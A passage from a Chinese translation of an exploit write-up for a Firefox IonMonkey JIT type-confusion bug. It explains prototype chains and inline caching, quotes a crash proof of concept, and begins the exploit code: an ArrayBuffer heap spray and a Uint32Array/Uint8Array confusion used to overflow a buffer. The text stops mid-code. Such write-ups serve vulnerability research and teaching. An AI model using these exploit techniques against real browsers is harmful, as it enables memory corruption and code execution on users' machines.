注：本篇文章是一篇译文。主要内容为火狐64位上的漏洞利用，原作者寻找解决的方法，和利用的思路非常值得学习。内容相当丰富。文章最后2部分，因为不涉及到具体的技术，故没有翻译。  
原文链接：
  * IonMonkey不检查当前元素 prototypes 上的索引元素，只检查 ArrayPrototype。内联Array.pop之后，这会导致类型混淆。
  * 我们混淆了一个 Uint32Array 和一个 Uint8Array 来获取 ArrayBuffer 中的溢出并继续将其转换为任意读写并执行了shellcode。
## 漏洞
这个漏洞，在[Project Zero bug tacker](https://bugs.chromium.org/p/project-zero/issues/detail?id=1820 "Project Zero bug tacker") 上已经有很好的描述。但这里，还是要仔细说明一下。
主要问题是在这：IonMonkey 在 **内联** **Arrary.prototype.pop** ,
**Arrary.prototype.push** , 和 **Arrary.prototype.slice** 时，没有检查 **prototype**
上的索引元素。它只检查 **Array prototype** 链上是否有任何索引元素。那么，在使用目标对象和 **Array prototype**
之间使用中间链，就可以很容易的绕过它。那什么是 **内联** 和 **prototype** 链？ 让我们在深入研究bug细节之前先简单介绍一下这些内容。
**prototype**
是JavaScript实现继承的方式。它基本上允许我们在各种对象之间共享属性和方法（我们可以将对象视为与其他OOP语言中的类相对应）。我的一个队友已经写了一篇关于
[JS prototypes](https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/ "JS prototypes") 的相当全面的文章，我建议阅读他帖子的前5部分。 prototypes 更深入的部分，可以在
[MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain "MDN") 页面上找到。  
内联缓存意味着保存先前查找的结果，以便下次进行相同的查找时，直接使用保存的值，节约查找的成本。因此，当我们调用：Array.pop（），那么初始查找涉及以下内容：
获取数组对象的 prototype ，然后在其属性中搜索 pop 函数，最后获取 pop 函数的地址。现在，如果此时内联 pop
函数，则保存此函数的地址，并在下次调用 Array.pop 时，所有这些查找都不需要重新计算。
V8开发人员 [Mathias Bynens](https://twitter.com/mathias "Mathias Bynens")
撰写了几篇关于[内联缓存](https://mathiasbynens.be/notes/shapes-ics "内联缓存")和
[prototype](https://mathiasbynens.be/notes/prototypes "prototype") 的非常好的文章。
现在让我们来看看saelo发现的崩溃样本
    // Run with --no-threads for increased reliability
    const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
    function v7(v8,v9) {
        if (v4.length == 0) {
            v4[3] = {a: 5};
        }
        // pop the last value. IonMonkey will, based on inferred types, conclude that the result
        // will always be an object, which is untrue when  p[0] is fetched here.
        const v11 = v4.pop();
        // Then if will crash here when dereferencing a controlled double value as pointer.
        v11.a;
        // Force JIT compilation.
        for (let v15 = 0; v15  a=[]
    []
    js> a[1]=1 // Sparse Array - element at index 0 does not exist
    1
    js> a
    [, 1]
    js> a.__proto__=[1234]
    [1234]
    js> a.pop()
    1
    js> a.pop() // Since a[0] is empty, and a.__proto__[0] exists, a.__proto__[0] is returned by Array.pop
    1234
现在问题 - 当 JIT 编译函数 v7 时，所有类型检查都被删除，因为观察到的类型与推断的类型相同，并且TI机制不跟踪原型上的类型。当数组 v4 pop
所有原始元素后，如果再次调用 v7，则将 v4 [3] 设置为对象。这意味着 v4 现在是一个稀疏数组，因为 v4 [0]，v4 [1] 和 v4 [2]
为空。 因此，当试图弹出 v4 [2] 和 v4 [1] 时，Array.pop会返回 prototype 中的值。现在，当它尝试对 v4 [0]
执行相同操作时，将返回浮点值而不是对象。但是 IonMoney 仍然认为
Array.pop（现在是浮点数）返回的值是一个对象，因为这里没有类型检查。接着，IonMoney 执行到 POC
下一部分，从返回的对象中获取属性“a”，此时就崩溃了，因为返回的不是一个对象的指针，而是一个用户控制的浮点数。
## 实现任意读写
我花了很多时间试图泄漏。 最初我的想法是创建一个浮点数组，并把 prototype 上将一个元素设置为一个对象。因此，IonMoney 会假设
Array.pop 总是返回一个浮点数并将对象指针视为浮点数并泄漏指针的地址。但这没有成功，这里会有检查代码来验证 Array.pop
返回的值是否为有效浮点数。对象指针是标记指针，因此是无效的浮点值。我不确定为什么在代码中有这样的检查，所以无法从这种方法进行泄漏，不得不花一些时间考虑替代方案。  
顺便说一句，我还写了一篇关于 [SpiderMonkey](https://vigneshsrao.github.io/play-with-spidermonkey/ "SpiderMonkey") 数据结构和概念的文章。
## Uint8Array 和 Uint32Array
由于 float 方法不起作用，我在想 JIT 编译时如何访问不同类型的对象。 在查看类型数组赋值时，我遇到了一些有趣的东西：
    mov    edx,DWORD PTR [rcx+0x28] # rcx contains the starting address of the typed array
    cmp    edx,eax
    jbe    0x6c488017337
    xor    ebx,ebx
    cmp    eax,edx
    cmovb  ebx,eax
    mov    rcx,QWORD PTR [rcx+0x38] # after this rcx contains the underlying buffer
    mov    DWORD PTR [rcx+rbx*4],0x80
这里 rcx 是指向数组的指针，而 eax 包含我们分配的索引。[rcx+0x28]
实际上是保持数组的大小。因此，检查是为了确保索引小于数组大小，但没有进行对象的检查（因为删除了类型检查）。这意味着，如果JIT编译的是
Uint32Array 对象并且 prototype 包含 Uint8Array对象，那这将造成溢出。这是因为 IonMonkey 总期望是一个
Uint32Array 进行操作（从汇编代码的最后一行可以看出，它直接执行一个mov DWORD PTR），但如果数组类型是 Uint8Array
那么它的大小将变大（因为现在每个元素都是一个字节而不是 dword）。  
因此，如果我们传递一个大于 Uint32Array 大小的索引，它将通过检查并初始化。  
例如，上面的代码是下面的编译形式 ：
    v11[a1] = 0x80
其中 v11 = Uint32Array 数组。 底层 ArrayBuffer 的大小是32（0x20）字节。这意味着这个 Uint32Array 的大小是
32/4 = 8 个元素。现在，如果 v11 突然改变为同一底层 ArrayBuffer 上的 Uint8Array，那么大小（[rcx + 0x28]）是
32/1 = 32 个元素。但是在分配值时，代码仍然使用 mov DWORD PTR 而不是 mov BYTE PTR 。因此，如果我们将索引设为
30，那么检查将在与 32（而不是8 )进行比较时传递。 因此我们写入 buffer_base +（30 * 4）= buffer_base +
120，而缓冲区只有 32 个字节长！
现在我们要做的就是将缓冲区溢出转换为任意地址读写。
此溢出位于ArrayBuffer的缓冲区中。现在，如果缓冲区足够小（我认为小于96字节，但不确定），那么这个缓冲区是内联的，换句话说，就在
ArrayBuffer 类的 metadata 之后。 首先让我们看看可以实现此溢出的代码。
    buf = []
    for(var i=0;i<100;i++)
    {
      buf.push(new ArrayBuffer(0x20));
    }
    var abuf = buf[5];
    var e = new Uint32Array(abuf);
    const arr = [e, e, e, e, e];
    function vuln(a1) {
        if (arr.length == 0) {
            arr[3] = e;
        }
        /*
        If the length of the array becomes zero then we set the third element of
        the array thus converting it into a sparse array without changing the
        type of the array elements. Thus spidermonkey's Type Inference System does